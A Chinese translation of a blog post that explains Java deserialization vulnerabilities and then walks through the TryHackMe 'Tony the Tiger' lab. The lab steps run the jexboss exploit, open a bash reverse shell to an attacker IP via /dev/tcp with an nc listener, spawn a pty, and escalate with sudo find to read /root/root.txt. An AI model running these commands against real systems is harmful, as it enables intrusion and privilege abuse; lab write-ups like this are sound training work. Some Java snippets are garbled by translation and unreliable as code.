# JAVA 序列化漏洞综合指南

> 原文：<https://infosecwriteups.com/a-comprehensive-guide-to-java-serialization-vulnerability-18fad6e37b64?source=collection_archive---------0----------------------->

> **TLDR:** 这个博客是为了全面了解 **java 序列化攻击**，它包括 CerealCTF-LinuxV2 或托尼老虎 boot2root 机器演练。

什么是 JAVA 中的序列化和反序列化

JAVA 中的对象

Java 是一种面向对象的编程语言，所以它包括“对象”的概念。

“对象”是面向对象编程的基本单位，代表现实生活中的实体。一个典型的 Java 程序会创建许多对象，如你所知，这些对象通过调用方法进行交互。

它包括

1.  **状态**:用物体的属性来表示。它还反映了对象的属性。
2.  **行为**:用一个对象的方法来表现。它还反映了一个对象对其他对象的响应。
3.  **身份**:给一个对象一个唯一的名字，使一个对象能够与其他对象交互。

关于物体的更多信息，请参考[https://geeksforgeeks.org/classes-objects-java/](http://geeksforgeeks.org/classes-objects-java/)

> 什么是字节流

**Java 字节流**用于执行 8 位**字节**的输入和输出

字节流逐字节(8 位)处理数据。例如，FileInputStream 用于从源读取，FileOutputStream 用于写入目标

![](img/a60f0c49ed13352a4fb141568c91429c.png)![](img/811bfe7223fc3c7af71f180a53d6b2f2.png)

> 什么是 JAVA 中的序列化

抽象的序列化是将“对象”转换成 java 字节流的过程，可以存储在文件、数据库和/或网络中供以后使用

为了使 Java 对象可序列化，我们实现了 **java.io.Serializable** 接口。
Object output stream 类包含用于序列化对象的 **writeObject()** 方法。

只有那些实现了 **java.io.Serializable** 接口的[类](https://www.geeksforgeeks.org/classes-objects-java/)的对象才能被序列化。

```
class A implements Serializable{

// B also implements Serializable
// interface.
B ob=new B();  
}
```

更多信息请参考-[https://www.geeksforgeeks.org/serialization-in-java/](https://www.geeksforgeeks.org/serialization-in-java/)

> 什么是反序列化

反序列化是将先前序列化的对象重新构造回其原始形式(即对象实例)的过程。反序列化过程的输入是我们通过网络的另一端获得的字节流，或者我们只是从文件系统/数据库中读取它

准确地说，这个字节流(或者说序列化数据)包含了被序列化过程序列化的实例的所有信息。这些信息包括类的元数据、实例字段的类型信息以及实例字段的值。当对象被重新构造回新的对象实例时，需要相同的信息。当反序列化一个对象时，JVM 从字节流中读取它的类元数据，指定一个对象的类是实现“可序列化”还是“可外部化”接口。

![](img/60f65c2a090f41af6b1c3c818fbe8c96.png)

> 现在两者是如何协同工作的

![](img/b9a8c9e0b8291f8445480556025f1e91.png)![](img/aaa3a6011f0cec7bd9d62b3e13853267.png)![](img/a1368251b92477556e80d6174de6d44a.png)

> **JAVA 反序列化攻击**

当应用程序**对来自不可信来源的**对象进行反序列化时，就会出现 **Java 反序列化**问题。

在这种攻击中，序列化的 Java 对象使攻击者能够完全远程控制应用服务器。

复杂的现代系统是高度分布式的。由于组件之间相互通信并共享信息(例如在服务之间移动数据、存储信息等)，本机二进制格式并不理想。简而言之，序列化是将二进制数据转换成字符串(ascii 字符)的过程，这样它就可以使用标准协议进行传输。

序列化操作在包括 API、微服务和客户端 MVC 的架构中非常常见。当被序列化和反序列化的数据是可信的(在系统的控制下)时，没有风险。

但是，当用户可以修改输入时，结果是不可信的反序列化漏洞。在这种情况下，从字符串到二进制的转换(反序列化)是一个容易被滥用的微妙操作。典型的操作过程是准备一个有效负载，其中包括在目标机器上远程执行代码。通常，目标是运行系统命令。

W 问题来了

序列化(反序列化)的使用本身不是问题。当用户(攻击者)可以控制被反序列化的数据时，例如，如果数据可以通过网络连接传递给反序列化例程，就会出现问题。如果攻击者控制了被反序列化的数据，那么他们就对内存中的变量和程序对象有一定的影响。随后，如果攻击者可以影响内存中的变量和程序对象，那么他们就可以影响使用这些变量和对象的代码流。让我们看一个 Java 反序列化的例子:

公开课程{

公共字符串用户名；

公共布尔登录；

公共 void load session(byte[]session data)引发异常{

ObjectInputStream ois = new ObjectInputStream(new bytearrayiputstream(session data))；

this . username = ois . read utf()；

this . loggedin = ois . read boolean()；

}

}

*'loadSession'* 方法接受一个字节数组作为参数，并将该字节数组中的字符串和布尔值反序列化到对象的 *'username'* 和 *'loggedIn'* 属性中。如果攻击者可以控制传递给该方法的*‘session data’*字节数组的内容，那么他们就可以控制这些对象属性。以下是如何使用此会话对象的示例:

公共类 UserSettingsController {

public void update password(Session Session，String newPassword)引发异常{

if(session.loggedIn) {

user model . update password(session . username，new password)；

}否则{

抛出新异常(“错误:用户未登录。”);

}

}

}

如果会话已登录，则用户名存储在会话中的用户的密码将更新为给定值。这是一个简单的*‘POP Gadget’*的例子，一段我们可以通过对象的属性来控制的代码。

现在让我们利用这个漏洞来利用托尼老虎机。

> 托尼老虎机器演练

现在我们将展示这一漏洞有多危险，其影响范围从 DOS 到 RCE。

这是我们将在本演练中使用的计算机的链接

链接-[https://tryhackme.com/room/tonythetiger](https://tryhackme.com/room/tonythetiger)

![](img/6377af519fc211351e7053561bdbd401.png)![](img/d8c318d583b267c33cf170b0f4769877.png)

好的，让我们对它进行 nmap 扫描

`nmap --top-ports=50 -sV [machine-ip]`

![](img/a079c6ff2934fda15216b23542068cdd.png)

`nmap -p- [machine-ip]`

![](img/ccee0e140ad6e5e13762ee9ccf5eb0da.png)

好的，首先我们需要从博客上获取托尼的旗帜，博客在端口 80 上，所以我们去那里

![](img/fb39108b0b87b012fcb85efe92356542.png)

在博客上四处漫游后，我们可以找到国旗，但在“霜花”博客上，我们看到的是一幅图像

![](img/a2bd4957bab01127a86b856a52c73c94.png)

所以我首先想到的是斯缇格。

让我们下载图像并分析它，检查图像中隐藏数据的第一件事是查看它的十六进制数据

下载图像后，让我们使用`strings` 来检查它的十六进制数据

`strings be2sOV9.jpg`

滚动到最后，我们可以看到旗帜

![](img/43d9ac96121b55f5f4ab6f80d48a0570.png)

顺便说一下，两个旗是一样的，这里没有两个旗是一样的。它只是在十六进制数据中出现了两次

现在让我们做主要的事情，利用 java 序列化缺陷。

我们看到 Apache Tomcat/Coyote JSP engine 1.1 正在端口 8080 上运行，让我们访问它

![](img/e46b810cd284666e42093b5296d386ee.png)

好的，它运行 JBOSS 作为前端应用程序，所以我们可以在这里利用 java 序列化错误

让谷歌 jboss 利用

![](img/90a7ad956ebf1c2ca0755e5f2ad9a75f.png)

好的，让我们来看第一个链接，它指向一个 github 库

![](img/b91e3859e31d17f31010d6df182064cd.png)

让我们遵循回购协议中给出的这些步骤

![](img/64313c11ecb70452a2ec46a9284bc930.png)

完成上述所有步骤后，让我们运行最后一个命令(请按照上面给出的方法设置漏洞，并运行所有命令使其工作)

`python2 jexboss.py -host [http://[machine-ip]:8080](http://[machine-ip]:8080)`

![](img/dd9cb3f464e38eecc7a87fbfe125b04b.png)

运行上面的命令后，我们将得到

![](img/fd6e82e5506eac9d5da7c63aa973f317.png)

伙计们，最初我的漏洞利用失败了，但再次运行后，它的工作，有时你需要运行漏洞利用两三次，如果它在第一次不工作

现在让我们在我在这里选择的任何想要的端口 1234 上运行我们的 netcat 监听器

`nc -lvp 1234`

让我们运行`/bin/bash -i > /dev/tcp/[your-ip]/[nc-listening-port] 0>&1 2>&1`

![](img/83a4753524eb72a6307fb5cfcbafd313.png)![](img/09c0198a54b04245557d535df7c1136a.png)

我们在 netcat 监听器上进行会话

![](img/86af6f7c3fe265837d4b3fc66ae579b0.png)

好了，现在我们是用户“cmnatic ”,我们需要“jboss”用户标志，因此让我们转到主目录并查看权限

![](img/d03a6121ffce70b483ab416352ca2c1c.png)

好的，我们可以进入 jboss 主目录

让我们去 jboss 目录

在进入 jboss 用户目录后，我们看到了一个文件“注释”,让我们通读一下`cat`

![](img/d47eca69fbb7a1790a310e37f03a79a3.png)![](img/5f28f34a37233055c6238f91867eb26c.png)

答对了，我们得到了用户“jboss”的密码，让我们把自己从“cmnatic”改成“jboss”

在更改用户之前，我们需要用 python 生成 pty shell，以便运行`su`命令。

`python -c 'import pty;pty.spawn("/bin/bash")'`

那就跑

`su jboss`

![](img/76cf7a045aa0354bbcfe28c75d9bd0bd.png)

好了，现在我们需要找到 jboss 用户的标志

让我们看看 jboss 用户目录中的隐藏文件

`ls -la`

![](img/8f675d30787c71c7888266b10758a589.png)

我们看到了一个有趣的文本文件。让我们来看看

![](img/69bcf8daf9927acd66d53521699699b6.png)

我们在那里拿到了旗子

现在我们需要得到超级用户的根标志，让我们检查一下作为用户“jboss ”,我们可以用超级用户权限在系统上运行什么命令

`sudo -l`

![](img/835845b5d30b7e887faffeb02ae07ff8.png)

我们可以 root cool 身份运行`find`命令，我们可以用它来提升权限

为此，我们可以参考黑客博客中关于使用`find`命令提升权限的文章

link-[https://www . hacking articles . in/Linux-for-pentester-find-privilege-escalation/](https://www.hackingarticles.in/linux-for-pentester-find-privilege-escalation/)

运行此命令查看根标志

`touch raj`

`sudo find raj -exec cat /root/root.txt \;`

![](img/76475e6c611dd82fc2ebe189644b003b.png)

好吧，但这不是一个标志(虽然在挑战中提到最后一个标志不是 THM{}格式，但这是 base64 编码，而不是任何文本)

让我们解码这个 base64 数据

![](img/b392af62fa2efa70e6f8d8b8910e1467.png)

好了，我们又得到了一个散列值，看起来像 md5，让我们用破解站来破解它

![](img/7a0e6319582832c889bc3d9e49c9574e.png)

瞧啊。！我们拿到了我们的根旗

作者:infosec_boy

[](https://www.linkedin.com/in/anubhav-mandarwal-318952186/) [## anubhav mandarwal -副威胁研究员-网络| LinkedIn

### 查看 anubhav mandarwal 在世界上最大的职业社区 LinkedIn 上的个人资料。anubhav 有 3 份工作列在…

www.linkedin.com](https://www.linkedin.com/in/anubhav-mandarwal-318952186/) [](https://twitter.com/infosec_boy) [## 阿努巴夫·曼德瓦尔

### anubhav mandarwal 的最新推文(@infosec_boy)。一个喜欢摆弄机器和捕捉虫子的人💻…

twitter.com](https://twitter.com/infosec_boy)  [## 登录* Instagram

### 欢迎回到 Instagram。登录查看您的朋友、家人和兴趣爱好捕捉和分享了什么…

www.instagram.com](https://www.instagram.com/infosec_boy/)